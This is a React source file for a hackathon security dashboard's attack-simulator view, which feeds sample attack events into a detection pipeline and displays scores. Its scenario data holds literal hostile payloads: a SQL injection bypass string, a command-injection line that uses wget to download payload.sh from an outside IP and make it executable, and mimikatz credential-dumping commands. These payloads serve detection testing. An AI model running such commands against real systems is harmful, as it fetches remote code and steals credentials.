import React, { useState } from 'react';
import { 
  Database, 
  Terminal, 
  Bug, 
  KeyRound, 
  Radar, 
  Play, 
  CheckCircle2, 
  ArrowRight, 
  ShieldAlert, 
  Cpu, 
  Sparkles,
  Info,
  Clock
} from 'lucide-react';
import { api, PipelineSimulationResponse } from '../services/api';
import { AlertRecord } from '../types';
import { ThreatScoreBadge } from './ThreatScoreBadge';

interface AttackSimulatorViewProps {
  onAlertGenerated: (alert: AlertRecord) => void;
  onViewAlertDetail: (alert: AlertRecord) => void;
}

export const AttackSimulatorView: React.FC<AttackSimulatorViewProps> = ({
  onAlertGenerated,
  onViewAlertDetail
}) => {
  const [runningType, setRunningType] = useState<string | null>(null);
  const [lastSimulation, setLastSimulation] = useState<PipelineSimulationResponse | null>(null);
  const [customMode, setCustomMode] = useState(false);
  const [customIp, setCustomIp] = useState('185.220.101.45');
  const [customHost, setCustomHost] = useState('web-prod-01');
  const [customPayload, setCustomPayload] = useState("' OR '1'='1 --");

  const attackScenarios = [
    {
      id: 'sql-injection' as const,
      title: 'SQL Injection',
      icon: Database,
      category: 'Web Application Attack',
      defaultIp: '185.220.101.45',
      target: 'web-prod-01',
      payload: "' OR '1'='1 --",
      expectedScore: '94 / 100',
      expectedSeverity: 'CRITICAL',
      description: 'Injects boolean-based SQL bypass syntax into authenticated endpoint parameters.',
      impact: 'Triggers IOC match against Tor Exit blocklist, CVE-2023-34362 correlation, and automated IP block simulation.'
    },
    {
      id: 'rce' as const,
      title: 'Remote Code Execution',
      icon: Terminal,
      category: 'Command Injection',
      defaultIp: '194.26.29.112',
      target: 'db-core-01',
      payload: "; /bin/bash -c 'wget http://185.220.101.45/payload.sh -O /tmp/x; chmod +x /tmp/x'",
      expectedScore: '96 / 100',
      expectedSeverity: 'CRITICAL',
      description: 'Executes reverse shell stager commands via vulnerable management API daemon.',
      impact: 'Triggers RCE rule, C2 beacon IOC detection, CVE-2024-12345 match, and host quarantine simulation.'
    },
    {
      id: 'malware' as const,
      title: 'Malware & Mimikatz',
      icon: Bug,
      category: 'Endpoint Credential Stealer',
      defaultIp: '194.26.29.112',
      target: 'api-checkout-prod',
      payload: 'mimikatz.exe privilege::debug sekurlsa::logonpasswords exit',
      expectedScore: '92 / 100',
      expectedSeverity: 'CRITICAL',
      description: 'Simulates memory dump of LSASS secrets via known malicious executable hash.',
      impact: 'Matches known hash in VirusTotal intelligence, CVE-2024-21413, and process kill simulation.'
    },
    {
      id: 'brute-force' as const,
      title: 'Authentication Brute Force',
      icon: KeyRound,
      category: 'Credential Stuffing',
      defaultIp: '103.145.13.204',
      target: 'auth-gateway-01',
      payload: 'admin:failed_login_sequences',
      expectedScore: '68 / 100',
      expectedSeverity: 'HIGH',
      description: 'Simulates rapid failed authentication attempts exceeding threshold limits.',
      impact: 'Triggers rate-limit behavioral correlation, user account lock recommendation, and incident ticket.'
    },
    {
      id: 'port-scan' as const,
      title: 'Port Scanning Recon',
      icon: Radar,
      category: 'Network Reconnaissance',
      defaultIp: '45.154.255.89',
      target: 'internal-dns-01',
      payload: 'SYN probes across ports 21, 22, 80, 443, 3389, 8080',
      expectedScore: '65 / 100',
      expectedSeverity: 'HIGH',
      description: 'Probes multiple internal listening ports to map perimeter service exposure.',
      impact: 'Matches Mirai scanner IOC reputation and triggers automated firewall rule recommendation.'
    }
  ];

  const handleRunSimulation = async (
    type: 'sql-injection' | 'rce' | 'malware' | 'brute-force' | 'port-scan',
    customArgs?: { source_ip?: string; hostname?: string; payload?: string }
  ) => {
    setRunningType(type);
    try {
      const result = await api.simulateAttack(type, customArgs);
      setLastSimulation(result);
      if (result.alert) {
        onAlertGenerated(result.alert);
      }
    } catch (err) {
      console.error('Simulation failed:', err);
    } finally {
      setRunningType(null);
    }
  };

  return (
    <div className="space-y-8 animate-in fade-in duration-300">
      {/* Top Banner / Explanation */}
      <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 p-6 rounded-lg bg-slate-900 border border-slate-800">
        <div className="space-y-1">
          <div className="flex items-center gap-2">
            <span className="font-mono text-xs uppercase text-rose-400 font-semibold tracking-wider">
              PRISM Attack Simulator
            </span>
            <span aria-hidden="true" className="text-slate-600">·</span>
            <span className="text-xs text-slate-400">Hackathon Interactive Sandbox</span>
          </div>
          <h1 className="text-xl font-bold text-white tracking-tight">
            Live Threat Ingestion & Response Playground
          </h1>
          <p className="text-sm text-slate-400 max-w-2xl">
            Execute real cybersecurity attacks against the PRISM engine. Each scenario passes through real event normalization, signature detection, IOC/CVE correlation, explainable scoring, and automated simulated mitigation.
          </p>
        </div>

        <button
          onClick={() => setCustomMode(!customMode)}
          className={`px-4 py-2 text-xs font-medium rounded border transition-colors whitespace-nowrap self-start md:self-auto ${
            customMode
              ? 'bg-rose-950/60 border-rose-700 text-rose-300'
              : 'bg-slate-800 border-slate-700 text-slate-300 hover:bg-slate-700'
          }`}
        >
          {customMode ? 'Standard Scenarios' : 'Custom Payload Mode'}
        </button>
      </div>

      {/* Custom Attack Payload Drawer */}
      {customMode && (
        <div className="p-6 rounded-lg bg-slate-900/90 border border-slate-800 space-y-4">
          <h3 className="text-sm font-semibold text-white flex items-center gap-2">
            <Terminal className="w-4 h-4 text-rose-400" />
            <span>Custom Attack Event Generator</span>
          </h3>

          <div className="grid grid-cols-1 md:grid-cols-3 gap-4 text-xs font-mono">
            <div>
              <label className="block text-slate-400 mb-1">Attacker Source IP</label>
              <input
                type="text"
                value={customIp}
                onChange={e => setCustomIp(e.target.value)}
                className="w-full px-3 py-2 bg-slate-950 border border-slate-700 rounded text-slate-200 focus:outline-none focus:border-rose-500"
                placeholder="185.220.101.45"
              />
            </div>

            <div>
              <label className="block text-slate-400 mb-1">Target Hostname</label>
              <input
                type="text"
                value={customHost}
                onChange={e => setCustomHost(e.target.value)}
                className="w-full px-3 py-2 bg-slate-950 border border-slate-700 rounded text-slate-200 focus:outline-none focus:border-rose-500"
                placeholder="web-prod-01"
              />
            </div>

            <div>
              <label className="block text-slate-400 mb-1">Attack Type Preset</label>
              <select
                className="w-full px-3 py-2 bg-slate-950 border border-slate-700 rounded text-slate-200 focus:outline-none focus:border-rose-500"
                onChange={e => {
                  if (e.target.value === 'sqli') setCustomPayload("' OR '1'='1 --");
                  if (e.target.value === 'rce') setCustomPayload("; /bin/bash -c 'whoami'");
                  if (e.target.value === 'malware') setCustomPayload("mimikatz.exe sekurlsa::logonpasswords");
                }}
              >
                <option value="sqli">SQL Injection</option>
                <option value="rce">Remote Code Execution</option>
                <option value="malware">Malware Execution</option>
              </select>
            </div>

            <div className="md:col-span-3">
              <label className="block text-slate-400 mb-1">Malicious Payload / Query</label>
              <textarea
                value={customPayload}
                onChange={e => setCustomPayload(e.target.value)}
                rows={2}
                className="w-full px-3 py-2 bg-slate-950 border border-slate-700 rounded text-slate-200 focus:outline-none focus:border-rose-500"
                placeholder="' OR '1'='1 --"
              />
            </div>
          </div>

          <button
            onClick={() => handleRunSimulation('sql-injection', { source_ip: customIp, hostname: customHost, payload: customPayload })}
            disabled={runningType !== null}
            className="px-4 py-2 text-xs font-semibold text-white bg-rose-600 hover:bg-rose-500 rounded transition-colors disabled:opacity-50 flex items-center gap-2"
          >
            <Play className="w-3.5 h-3.5 fill-current" />
            <span>Transmit Custom Attack Event</span>
          </button>
        </div>
      )}

      {/* 5 Scenario Cards Grid */}
      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
        {attackScenarios.map(scenario => {
          const Icon = scenario.icon;
          const isRunning = runningType === scenario.id;

          return (
            <div
              key={scenario.id}
              className="flex flex-col justify-between p-5 rounded-lg bg-slate-900/80 border border-slate-800 hover:border-slate-700 transition-all space-y-4"
            >
              <div className="space-y-3">
                <div className="flex items-start justify-between">
                  <div className="flex items-center gap-3">
                    <div className="p-2 rounded bg-slate-800 text-rose-400">
                      <Icon className="w-5 h-5" />
                    </div>
                    <div>
                      <h3 className="text-sm font-semibold text-white">{scenario.title}</h3>
                      <span className="text-[11px] text-slate-400">{scenario.category}</span>
                    </div>
                  </div>
                  <span className={`text-[10px] font-mono px-2 py-0.5 rounded border ${
                    scenario.expectedSeverity === 'CRITICAL'
                      ? 'bg-rose-950/40 text-rose-300 border-rose-800/40'
                      : 'bg-amber-950/40 text-amber-300 border-amber-800/40'
                  }`}>
                    {scenario.expectedSeverity}
                  </span>
                </div>

                <p className="text-xs text-slate-400 leading-relaxed">
                  {scenario.description}
                </p>

                <div className="p-2.5 rounded bg-slate-950/60 border border-slate-800/80 space-y-1 font-mono text-[11px]">
                  <div className="flex justify-between">
                    <span className="text-slate-500">Source:</span>
                    <span className="text-slate-300">{scenario.defaultIp}</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-slate-500">Target:</span>
                    <span className="text-slate-300">{scenario.target}</span>
                  </div>
                  <div className="text-slate-500 truncate pt-1 border-t border-slate-800/60">
                    <code className="text-amber-300/90">{scenario.payload}</code>
                  </div>
                </div>
              </div>

              <div className="pt-2 border-t border-slate-800 flex items-center justify-between">
                <span className="text-[11px] text-slate-400 font-mono">
                  Est. Score: <strong className="text-slate-200">{scenario.expectedScore}</strong>
                </span>

                <button
                  onClick={() => handleRunSimulation(scenario.id)}
                  disabled={runningType !== null}
                  className={`flex items-center gap-1.5 px-3 py-1.5 text-xs font-semibold rounded transition-colors ${
                    isRunning
                      ? 'bg-rose-900 text-rose-200 animate-pulse'
                      : 'bg-rose-600 hover:bg-rose-500 text-white shadow-sm shadow-rose-950'
                  } disabled:opacity-50`}
                >
                  <Play className="w-3.5 h-3.5 fill-current" />
                  <span>{isRunning ? 'Processing...' : 'Simulate Attack'}</span>
                </button>
              </div>
            </div>
          );
        })}
      </div>

      {/* Live Simulation Execution Trace (Shown when an attack has been run) */}
      {lastSimulation && (
        <div className="p-6 rounded-lg bg-slate-900 border border-slate-800 space-y-6">
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pb-4 border-b border-slate-800">
            <div>
              <div className="flex items-center gap-2">
                <span className="w-2 h-2 rounded-full bg-emerald-400 animate-ping" />
                <h3 className="text-base font-bold text-white">
                  Attack Pipeline Execution Trace
                </h3>
              </div>
              <p className="text-xs text-slate-400 mt-0.5">
                Real-time end-to-end traversal from raw telemetry packet to automated SOC incident response.
              </p>
            </div>

            {lastSimulation.alert && (
              <button
                onClick={() => onViewAlertDetail(lastSimulation.alert!)}
                className="flex items-center gap-2 px-3.5 py-1.5 text-xs font-semibold text-white bg-slate-800 hover:bg-slate-700 rounded border border-slate-700 transition-colors whitespace-nowrap"
              >
                <span>Inspect Created Alert</span>
                <ArrowRight className="w-3.5 h-3.5" />
              </button>
            )}
          </div>

          {/* Trace steps */}
          <div className="space-y-3 font-mono text-xs">
            {lastSimulation.simulation_trace.map(step => (
              <div
                key={step.step}
                className="flex items-start gap-3 p-3 rounded bg-slate-950/60 border border-slate-800"
              >
                <div className="flex items-center justify-center w-6 h-6 rounded-full bg-slate-800 text-slate-300 font-bold shrink-0 mt-0.5">
                  {step.step}
                </div>
                <div className="space-y-0.5 flex-1">
                  <div className="flex items-center justify-between">
                    <span className="font-semibold text-slate-200">{step.title}</span>
                    <span className={`text-[10px] px-1.5 py-0.5 rounded ${
                      step.status === 'COMPLETED'
                        ? 'bg-emerald-950/40 text-emerald-400 border border-emerald-800/40'
                        : 'bg-slate-800 text-slate-400'
                    }`}>
                      {step.status}
                    </span>
                  </div>
                  <p className="text-slate-400 text-[11px] leading-relaxed">
                    {step.output}
                  </p>
                </div>
              </div>
            ))}
          </div>

          {/* Result Card */}
          {lastSimulation.alert && (
            <div className="p-4 rounded-lg bg-rose-950/20 border border-rose-800/40 flex flex-col md:flex-row items-start md:items-center justify-between gap-4">
              <div className="space-y-1">
                <span className="text-xs font-semibold text-rose-300 uppercase tracking-wider block">
                  Automated Mitigation Activated (Simulation Mode)
                </span>
                <p className="text-xs text-slate-300">
                  Attacker IP <strong className="text-rose-400 font-mono">{lastSimulation.alert.source_ip}</strong> reached Threat Score <strong className="text-white font-mono">{lastSimulation.alert.threat_score}/100</strong>. Action <strong>BLOCK_IP</strong> was recorded in the PRISM Security Audit Log and Incident <strong>#{lastSimulation.alert.incident_id || 'INC-NEW'}</strong> was created.
                </p>
              </div>

              <div className="shrink-0">
                <ThreatScoreBadge score={lastSimulation.alert.threat_score} severity={lastSimulation.alert.severity} size="md" />
              </div>
            </div>
          )}
        </div>
      )}
    </div>
  );
};
